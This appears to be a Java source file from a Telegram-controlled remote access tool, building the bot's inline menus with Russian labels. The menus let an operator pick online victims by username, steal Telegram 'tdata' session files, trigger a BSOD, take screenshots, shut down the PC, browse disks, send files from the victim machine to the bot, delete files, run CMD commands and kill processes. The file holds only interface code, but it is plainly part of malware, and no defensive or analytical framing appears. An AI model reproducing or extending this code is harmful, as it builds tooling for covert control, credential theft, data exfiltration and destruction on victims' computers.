package dev.erafox.monitor.ui;

import org.telegram.telegrambots.meta.api.objects.replykeyboard.InlineKeyboardMarkup;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardButton;
import org.telegram.telegrambots.meta.api.objects.replykeyboard.buttons.InlineKeyboardRow;
import dev.erafox.monitor.session.UserSession;
import java.io.File;
import java.util.*;

public class KeyboardBuilder {
    public static InlineKeyboardMarkup buildOnlineUserList(List<String> usernames) {
        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        List<InlineKeyboardRow> rows = new ArrayList<>();

        for (String username : usernames) {
            InlineKeyboardButton button = new InlineKeyboardButton("👤 " + username);
            button.setCallbackData("usr_" + username);
            InlineKeyboardRow row = new InlineKeyboardRow();
            row.add(button);
            rows.add(row);
        }

        InlineKeyboardButton refreshBtn = new InlineKeyboardButton("🔄 Обновить");
        refreshBtn.setCallbackData("refresh");
        InlineKeyboardRow refreshRow = new InlineKeyboardRow();
        refreshRow.add(refreshBtn);
        rows.add(refreshRow);

        markup.setKeyboard(rows);
        return markup;
    }

    public static InlineKeyboardMarkup buildActionMenu() {
        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        List<InlineKeyboardRow> rows = new ArrayList<>();

        String[] actions = {
                "0. Стиллер tdata", "act_tdata",
                "1. BSOD", "act_bsod",
                "2. Скриншот", "act_screenshot",
                "3. Выключение ПК", "act_shutdown",
                "4. Файловый менеджер", "act_fileman",
                "5. Диспетчер задач", "act_taskman",
                "6. Выполнить CMD", "act_runcmd",
                "7. Открыть файл", "act_openfile"
        };

        for (int i = 0; i < actions.length; i += 2) {
            InlineKeyboardButton btn = new InlineKeyboardButton(actions[i]);
            btn.setCallbackData(actions[i + 1]);
            InlineKeyboardRow row = new InlineKeyboardRow();
            row.add(btn);
            rows.add(row);
        }

        InlineKeyboardButton backBtn = new InlineKeyboardButton("« Назад");
        backBtn.setCallbackData("back");
        InlineKeyboardRow backRow = new InlineKeyboardRow();
        backRow.add(backBtn);
        rows.add(backRow);

        markup.setKeyboard(rows);
        return markup;
    }

    public static InlineKeyboardMarkup buildFileManagerView(File currentDir, UserSession session) {
        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        List<InlineKeyboardRow> rows = new ArrayList<>();

        if (session.getCurrentPath().length() <= 3) {
            File[] roots = File.listRoots();
            for (File root : roots) {
                InlineKeyboardButton btn = new InlineKeyboardButton("📀 " + root.getPath());
                btn.setCallbackData("fm_disk_" + root.getPath());
                InlineKeyboardRow row = new InlineKeyboardRow();
                row.add(btn);
                rows.add(row);
            }
        }

        File[] files = currentDir.listFiles();
        if (files != null) {
            List<File> dirs = new ArrayList<>();
            List<File> fileList = new ArrayList<>();
            for (File f : files) {
                if (f.isDirectory()) dirs.add(f);
                else fileList.add(f);
            }
            dirs.sort(Comparator.comparing(File::getName));
            fileList.sort(Comparator.comparing(File::getName));

            for (File dir : dirs) {
                InlineKeyboardButton btn = new InlineKeyboardButton("📁 " + dir.getName());
                btn.setCallbackData("fm_enter_" + dir.getAbsolutePath().replace("\\", "\\\\"));
                InlineKeyboardRow row = new InlineKeyboardRow();
                row.add(btn);
                rows.add(row);
            }

            for (File file : fileList) {
                InlineKeyboardButton btn = new InlineKeyboardButton("📄 " + file.getName());
                btn.setCallbackData("fm_file_" + file.getAbsolutePath().replace("\\", "\\\\"));
                InlineKeyboardRow row = new InlineKeyboardRow();
                row.add(btn);
                rows.add(row);
            }
        }

        InlineKeyboardRow navRow = new InlineKeyboardRow();
        if (!session.getCurrentPath().equals("")) {
            InlineKeyboardButton upBtn = new InlineKeyboardButton("📁 Вверх");
            upBtn.setCallbackData("fm_back_up");
            navRow.add(upBtn);
        }
        InlineKeyboardButton backBtn = new InlineKeyboardButton("« Назад");
        backBtn.setCallbackData("back");
        navRow.add(backBtn);
        rows.add(navRow);

        markup.setKeyboard(rows);
        return markup;
    }

    public static InlineKeyboardMarkup buildFileOptions(File file, UserSession session) {
        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        List<InlineKeyboardRow> rows = new ArrayList<>();

        InlineKeyboardButton openBtn = new InlineKeyboardButton("📂 Открыть на ПК");
        openBtn.setCallbackData("fm_openfile_" + file.getAbsolutePath().replace("\\", "\\\\"));
        InlineKeyboardRow row1 = new InlineKeyboardRow();
        row1.add(openBtn);
        rows.add(row1);

        InlineKeyboardButton sendBtn = new InlineKeyboardButton("📤 Отправить в бота");
        sendBtn.setCallbackData("fm_dlfile_" + file.getAbsolutePath().replace("\\", "\\\\"));
        InlineKeyboardRow row2 = new InlineKeyboardRow();
        row2.add(sendBtn);
        rows.add(row2);

        InlineKeyboardButton deleteBtn = new InlineKeyboardButton("🗑 Удалить");
        deleteBtn.setCallbackData("fm_delfile_" + file.getAbsolutePath().replace("\\", "\\\\"));
        InlineKeyboardRow row3 = new InlineKeyboardRow();
        row3.add(deleteBtn);
        rows.add(row3);

        InlineKeyboardButton backBtn = new InlineKeyboardButton("« Назад к файлам");
        backBtn.setCallbackData("fm_back_up");
        InlineKeyboardRow backRow = new InlineKeyboardRow();
        backRow.add(backBtn);
        rows.add(backRow);

        markup.setKeyboard(rows);
        return markup;
    }

    public static InlineKeyboardMarkup buildProcessListView(List<dev.erafox.monitor.executor.WindowsCommandExecutor.ProcessInfo> processes) {
        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        List<InlineKeyboardRow> rows = new ArrayList<>();

        for (dev.erafox.monitor.executor.WindowsCommandExecutor.ProcessInfo proc : processes) {
            InlineKeyboardButton btn = new InlineKeyboardButton("🟢 " + proc.name + " (PID: " + proc.pid + ")");
            btn.setCallbackData("proc_pid_" + proc.pid);
            InlineKeyboardRow row = new InlineKeyboardRow();
            row.add(btn);
            rows.add(row);
        }

        InlineKeyboardButton backBtn = new InlineKeyboardButton("« Назад");
        backBtn.setCallbackData("back");
        InlineKeyboardRow backRow = new InlineKeyboardRow();
        backRow.add(backBtn);
        rows.add(backRow);

        markup.setKeyboard(rows);
        return markup;
    }

    public static InlineKeyboardMarkup buildProcessOptions(String pid, UserSession session) {
        InlineKeyboardMarkup markup = new InlineKeyboardMarkup();
        List<InlineKeyboardRow> rows = new ArrayList<>();

        InlineKeyboardButton suspendBtn = new InlineKeyboardButton("⏸ Заморозить");
        suspendBtn.setCallbackData("proc_suspend_" + pid);
        InlineKeyboardRow row1 = new InlineKeyboardRow();
        row1.add(suspendBtn);
        rows.add(row1);

        InlineKeyboardButton resumeBtn = new InlineKeyboardButton("▶ Возобновить");
        resumeBtn.setCallbackData("proc_resume_" + pid);
        InlineKeyboardRow row2 = new InlineKeyboardRow();
        row2.add(resumeBtn);
        rows.add(row2);

        InlineKeyboardButton killBtn = new InlineKeyboardButton("💀 Завершить");
        killBtn.setCallbackData("proc_kill_" + pid);
        InlineKeyboardRow row3 = new InlineKeyboardRow();
        row3.add(killBtn);
        rows.add(row3);

        InlineKeyboardButton backBtn = new InlineKeyboardButton("« К списку процессов");
        backBtn.setCallbackData("proc_list");
        InlineKeyboardRow backRow = new InlineKeyboardRow();
        backRow.add(backBtn);
        rows.add(backRow);

        markup.setKeyboard(rows);
        return markup;
    }
}
